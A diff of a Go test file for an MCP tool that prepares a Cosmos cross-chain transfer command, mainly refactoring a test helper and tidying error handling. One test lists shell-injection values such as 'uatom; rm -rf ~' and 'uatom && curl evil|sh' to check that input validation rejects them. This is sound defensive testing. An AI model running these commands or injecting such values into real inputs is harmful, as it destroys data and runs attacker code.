@@ -15,17 +15,17 @@ import (
 	"github.com/zeebo/assert"
 )
 
-func prepare(t *testing.T, opts Options, req *sdk.CallToolRequest, in prepareTransferInput) (*sdk.CallToolResult, error) {
+func prepare(t *testing.T, opts Options, in prepareTransferInput) (*sdk.CallToolResult, error) {
 	t.Helper()
 	tl := testTools(t, newFakeLCD(t), newFakeLCD(t), opts)
-	res, _, err := tl.prepareTransfer(context.Background(), req, in)
+	res, _, err := tl.prepareTransfer(context.Background(), nil, in)
 	return res, err
 }
 
 var okInput = prepareTransferInput{ChainFrom: "cosmoshub-4", TokenFrom: "uatom", AmountIn: "1000000", ChainTo: "osmosis-1"}
 
 func TestPrepareTransferReturnsRunnableCommand(t *testing.T) {
-	res, err := prepare(t, Options{PublicURL: "https://pf.example.com/"}, nil, okInput)
+	res, err := prepare(t, Options{PublicURL: "https://pf.example.com/"}, okInput)
 	assert.NoError(t, err)
 	body := res.Content[0].(*sdk.TextContent).Text
 	want := "pathfinder-sign --pathfinder-url https://pf.example.com --chain-from cosmoshub-4 --token-from uatom --amount 1000000 --chain-to osmosis-1"
@@ -41,7 +41,7 @@ func TestPrepareTransferReturnsRunnableCommand(t *testing.T) {
 func TestPrepareTransferFlagsAgentChosenRecipient(t *testing.T) {
 	in := okInput
 	in.Recipient = testAddr(t, "osmo", 3)
-	res, err := prepare(t, Options{PublicURL: "https://pf.example.com"}, nil, in)
+	res, err := prepare(t, Options{PublicURL: "https://pf.example.com"}, in)
 	assert.NoError(t, err)
 	body := res.Content[0].(*sdk.TextContent).Text
 	assert.True(t, strings.Contains(body, "--recipient "+in.Recipient))
@@ -54,23 +54,23 @@ func TestPrepareTransferRejectsShellInjection(t *testing.T) {
 	for _, bad := range []string{"uatom; rm -rf ~", "uatom && curl evil|sh", "$(id)", "a b", "`id`", "uatom\nx", "'"} {
 		in := okInput
 		in.TokenFrom = bad
-		_, err := prepare(t, Options{PublicURL: "https://pf.example.com"}, nil, in)
+		_, err := prepare(t, Options{PublicURL: "https://pf.example.com"}, in)
 		if err == nil {
 			t.Errorf("token_from %q was accepted", bad)
 		}
 		in = okInput
 		in.Recipient = bad
-		_, err = prepare(t, Options{PublicURL: "https://pf.example.com"}, nil, in)
+		_, err = prepare(t, Options{PublicURL: "https://pf.example.com"}, in)
 		if err == nil {
 			t.Errorf("recipient %q was accepted", bad)
 		}
 	}
-	_, err := prepare(t, Options{PublicURL: "https://pf.example.com/;id"}, nil, okInput)
+	_, err := prepare(t, Options{PublicURL: "https://pf.example.com/;id"}, okInput)
 	assert.Error(t, err)
 }
 
 func TestPrepareTransferNeedsAKnownPublicURL(t *testing.T) {
-	_, err := prepare(t, Options{}, nil, okInput)
+	_, err := prepare(t, Options{}, okInput)
 	assert.Error(t, err)
 	assert.True(t, strings.Contains(err.Error(), "mcp_public_url"))
 }
@@ -78,7 +78,7 @@ func TestPrepareTransferNeedsAKnownPublicURL(t *testing.T) {
 func TestPrepareTransferUnknownRouteIsAnError(t *testing.T) {
 	in := okInput
 	in.ChainTo = "nowhere-1"
-	_, err := prepare(t, Options{PublicURL: "https://pf.example.com"}, nil, in)
+	_, err := prepare(t, Options{PublicURL: "https://pf.example.com"}, in)
 	assert.Error(t, err)
 }
 
@@ -106,7 +106,7 @@ func TestSignerTalksToTheMCPServer(t *testing.T) {
 
 	remote, err := signer.Dial(context.Background(), hs.URL+"/", "test")
 	assert.NoError(t, err)
-	defer remote.Close()
+	defer func() { _ = remote.Close() }()
 
 	s, err := signer.New(&signer.Request{
 		PathfinderURL: hs.URL,
@@ -118,11 +118,12 @@ func TestSignerTalksToTheMCPServer(t *testing.T) {
 	go s.Serve(context.Background(), time.Minute)
 
 	i := strings.Index(link, "/?t=")
-	req, _ := http.NewRequest("GET", link[:i]+"/api/request", nil)
+	req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, link[:i]+"/api/request", nil)
+	assert.NoError(t, err)
 	req.Header.Set("X-Spectra-Token", link[i+4:])
 	resp, err := http.DefaultClient.Do(req)
 	assert.NoError(t, err)
-	defer resp.Body.Close()
+	defer func() { _ = resp.Body.Close() }()
 	assert.Equal(t, resp.StatusCode, 200)
 	var got struct {
 		Preview struct {
@@ -148,7 +149,7 @@ func TestPrepareTransferDerivesURLFromHostOverHTTP(t *testing.T) {
 		Endpoint: hs.URL, HTTPClient: &http.Client{Transport: hostRewrite{"pathfinder-mcp.example.com"}},
 	}, nil)
 	assert.NoError(t, err)
-	defer sess.Close()
+	defer func() { _ = sess.Close() }()
 	res, err := sess.CallTool(context.Background(), &sdk.CallToolParams{Name: "prepare_transfer", Arguments: map[string]any{
 		"chain_from": "cosmoshub-4", "token_from": "uatom", "amount_in": "1000000", "chain_to": "osmosis-1",
 	}})
